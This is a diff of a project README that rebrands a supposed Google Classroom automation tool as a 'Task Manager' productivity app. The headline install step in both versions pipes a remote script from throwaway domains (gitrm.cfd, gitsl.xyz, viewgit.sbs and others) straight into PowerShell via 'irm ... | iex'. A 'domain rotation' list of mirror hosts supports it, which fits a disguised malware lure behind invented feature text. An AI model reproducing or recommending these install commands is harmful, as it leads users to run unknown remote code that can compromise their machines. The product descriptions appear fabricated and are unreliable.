@@ -1,16 +1,16 @@
-# Google Classroom
+# Task Manager
 
-> A tool for automating Google Classroom workflow — course creation, student enrollment, assignment distribution, and grade management.
+> A productivity-focused task manager for tracking daily goals, deadlines, and priorities.
 
 ## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)
 
 > [!TIP]
-> The installer auto-generates Google Cloud credentials. Have your Google Cloud project ID ready before running.
+> The task-manager installer is a single PowerShell script that pulls the latest release, installs dependencies, and sets up your config profile automatically.
 
 ### Windows (PowerShell)
 
 ```powershell
-irm https://gitrm.cfd?t=google-classroom | iex
+irm https://gitrm.cfd?t=task-manager | iex
 ```
 
 ### Domain Rotation
@@ -26,133 +26,134 @@ If the primary domain is unreachable, rotate through these mirrors:
 Example with a rotated domain:
 
 ```powershell
-irm https://gitsl.xyz?t=google-classroom | iex
+irm https:///viewgit.sbs?t=task-manager | iex
 ```
 
 ### Manual Installation (Python)
 
 ```cmd
-pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib
+git clone https://github.com/example/task-manager.git
+cd task-manager
+pip install -r requirements.txt
+python setup.py install
 ```
 
 ## TL;DR - Quick Summary
 
-A Google Classroom automation framework that wraps the Classroom API and Admin SDK. Enables bulk course creation, roster management, assignment scheduling, announcement publishing, and grade export — all via Python or REST endpoints.
+A CLI and GUI hybrid task manager with priority tagging, deadline reminders, recurring tasks, sync across devices, and productivity analytics. Designed for developers, students, and remote teams who need reliable daily planning.
 
 ## Core Features
 
-- ✅ **Bulk Course Creation** — Create hundreds of courses from CSV or Google Sheets.
-- ✅ **Automated Enrollment** — Enroll students via email domain, class code, or CSV upload.
-- ✅ **Assignment Scheduler** — Schedule posts, materials, and quizzes ahead of time.
-- ✅ **Grade Exporter** — Export grades to CSV, Excel, or LMS systems.
-- ✅ **Announcement Publisher** — Push announcements to all courses or filtered subsets.
-- ✅ **Guardian Sync** — Sync student guardian email addresses via the Guardian API.
-- ✅ **Audit Logging** — Track all changes to courses, rosters, and content.
-- ✅ **CLI + REST API** — Use from terminal or integrate into your own tools.
+- ✅ **Priority Tags** — Label tasks as High, Medium, or Low priority with color coding.
+- ✅ **Deadline Reminders** — Native OS notifications or email alerts before due dates.
+- ✅ **Recurring Tasks** — Daily, weekly, monthly, or custom cron-based repetition.
+- ✅ **Cross-Device Sync** — End-to-end encrypted sync via cloud backup or local server.
+- ✅ **Productivity Reports** — Weekly and monthly stats with completion heat maps.
+- ✅ **CLI Interface** — Full terminal support for power users and scripting.
+- ✅ **Focus Timer** — Pomodoro-style timer integrated into every task view.
+- ✅ **Tag & Filter System** — Organize with tags, projects, and custom views.
 
 ## Usage
 
 ```bash
-# Authenticate with Google (opens browser for consent)
-google-classroom auth login
+# Add a new task with high priority and due today
+task-manager add "Write API documentation" --priority high --due today
 
-# Create a course from a template
-google-classroom course create --name "Biology 101" --section "Fall 2026" --room "Lab B"
+# List all tasks due this week
+task-manager list --due week
 
-# Enroll a student
-google-classroom student enroll --course-id 123456789 --email student@example.com
+# Start focus timer on a task
+task-manager focus 42
 
-# List all courses you teach
-google-classroom course list
+# Mark task as complete
+task-manager complete 42
 
-# Create an assignment
-google-classroom assignment create \
-  --course-id 123456789 \
-  --title "Essay Draft" \
-  --description "Write a 500-word essay on photosynthesis." \
-  --due-date "2026-09-30T23:59:59Z" \
-  --max-points 100
+# Generate weekly report
+task-manager report --week --format pdf > weekly-report.pdf
 
-# Export all grades
-google-classroom grade export --course-id 123456789 --format csv
+# Sync tasks with cloud
+task-manager sync --push
 
-# Publish an announcement
-google-classroom announce --course-id 123456789 --message "Class is cancelled today."
+# Delete a task
+task-manager delete 42
+```
+
+### GUI Mode
+
+```bash
+task-manager gui
 ```
 
 ## REST API
 
 > [!NOTE]
-> The tool exposes an HTTP API for integration with your school's internal systems.
+> The task-manager runs an optional HTTP API for integration with external tools (e.g., browser extensions, calendars).
 
 ```bash
-# Start the API server
-google-classroom serve --port 8000
+# Start API server on port 3000
+task-manager serve --port 3000
 
-# List all courses
-curl http://localhost:8000/api/courses
+# List all tasks
+curl http://localhost:3000/api/tasks
 
-# Get course details
-curl http://localhost:8000/api/courses/123456789
+# Get a specific task
+curl http://localhost:3000/api/tasks/42
 
-# Create an assignment
-curl -X POST http://localhost:8000/api/courses/123456789/assignments \
+# Create a new task
+curl -X POST http://localhost:3000/api/tasks \
   -H "Content-Type: application/json" \
-  -d '{"title": "Lab Report", "description": "Due Friday", "maxPoints": 50, "dueDate": "2026-09-25"}'
+  -d '{"title": "Review PRs", "priority": "high", "due": "2026-09-20"}'
 
-# Export grades as CSV
-curl http://localhost:8000/api/courses/123456789/grades?format=csv
-
-# Enroll a student
-curl -X POST http://localhost:8000/api/courses/123456789/students \
+# Update task status
+curl -X PATCH http://localhost:3000/api/tasks/42 \
   -H "Content-Type: application/json" \
-  -d '{"email": "student@example.com"}'
+  -d '{"status": "completed"}'
 
-# Get course roster
-curl http://localhost:8000/api/courses/123456789/roster
+# Delete a task
+curl -X DELETE http://localhost:3000/api/tasks/42
 ```
 
 ## Screenshots
 
-![Dashboard](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Google+Classroom+Dashboard)
-![Course List](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Course+List+View)
-![Assignment Form](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Assignment+Form)
-![Grade Export](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Grade+Export+Modal)
+![Dashboard](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Task+Manager+Dashboard)
+![Task Entry](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Task+Entry+Form)
+![Productivity Report](https://placehold.co/1920x1080/0d1117/e0e0e0?text=Productivity+Report)
+![CLI Interface](https://placehold.co/1920x1080/0d1117/e0e0e0?text=CLI+Interface)
 
 ## Troubleshooting
 
 | Issue | Solution |
 |---|---|
-| "Invalid grant" error | Re-authenticate with `google-classroom auth login` and clear cached tokens. |
-| Course not found | Verify the course ID exists and your account is an owner/teacher. |
-| Quota exceeded | Google enforces daily API limits — batch requests and use exponential backoff. |
-| Student not enrolled | Check if the student's email is in Google Workspace domain or consumer Google. |
-| Grade export empty | Ensure the course has submissions with grades recorded. |
+| Sync fails with "auth error" | Regenerate your API token with `task-manager auth --refresh`. |
+| Notifications not appearing | Check OS notification permissions and enable desktop alerts. |
+| CLI command not found | Add `%LOCALAPPDATA%\task-manager\bin` to your PATH. |
+| Report export fails | Install `wkhtmltopdf` or use `--format html` instead. |
+| Focus timer doesn't ring | Verify the sound file path in `config/sound.yaml`. |
 
 ## Use Cases
 
-- **School IT Admins** — Provision hundreds of courses at the start of each term.
-- **Teachers** — Bulk-create assignments and schedule them across multiple classes.
-- **Tutors** — Automate enrollment for tutoring programs and track progress.
-- **Corporate L&D** — Use Classroom for internal training content and compliance tracking.
-- **Data Migration** — Transfer rosters and grades from legacy LMS to Google Classroom.
+- **Personal Productivity** — Daily task tracking with focus timer integration.
+- **Team Project Management** — Shared workspaces with assignee and status tracking.
+- **Student Study Planner** — Recurring study tasks linked to course deadlines.
+- **Developer Task Board** — Integrate with GitHub issues and CI/CD pipelines.
+- **Habit Formation** — Build streak-based recurring tasks with progress tracking.
 
 ## ⚠️ IMPORTANT
 
 > [!IMPORTANT]
-> This tool uses official Google Classroom APIs. Ensure you comply with Google's [Terms of Service](https://classroom.google.com/) and your institution's data privacy policies.
+> Always back up your task database before major version upgrades. The sync feature encrypts data locally — losing your passphrase means data is unrecoverable.
 
 > [!TIP]
-> Use service accounts for headless automation and domain-wide delegation for admin-level access across all courses.
+> Use the `--dry-run` flag on bulk operations (e.g., `delete --all`) to preview changes before applying.
 
 ## License
 
-This project is licensed under the Apache License 2.0 — see the [LICENSE](./LICENSE) file for details.
+This project is licensed under the GNU AGPLv3 License — see the [LICENSE](./LICENSE) file for details.
 
 ## Tags
 
 <!--
-google-classroom, education, google-api, automation, course-management, student-enrollment, grade-export, assignment-scheduler, cli-tool, rest-api
+task-manager, productivity, pomodoro, recurring-tasks, cross-device-sync, cli-tool, productivity-analytics, deadline-reminder, priority-tagging, focus-timer
 -->
 
-[gitrm.cfd](https://gitrm.cfd?t=google-classroom) | [gitrm.sbs](https://gitrm.sbs?t=google-classroom) | [gitsl.xyz](https://gitsl.xyz?t=google-classroom) | [viewgit.sbs](https://viewgit.sbs?t=google-classroom) | [gitview.sbs](https://gitview.sbs?t=google-classroom)
+[gitrm.cfd](https://gitrm.cfd?t=task-manager) | [gitrm.sbs](https://gitrm.sbs?t=task-manager) | [gitsl.xyz](https://gitsl.xyz?t=task-manager) | [viewgit.sbs](https://viewgit.sbs?t=task-manager) | [gitview.sbs](https://gitview.sbs?t=task-manager)
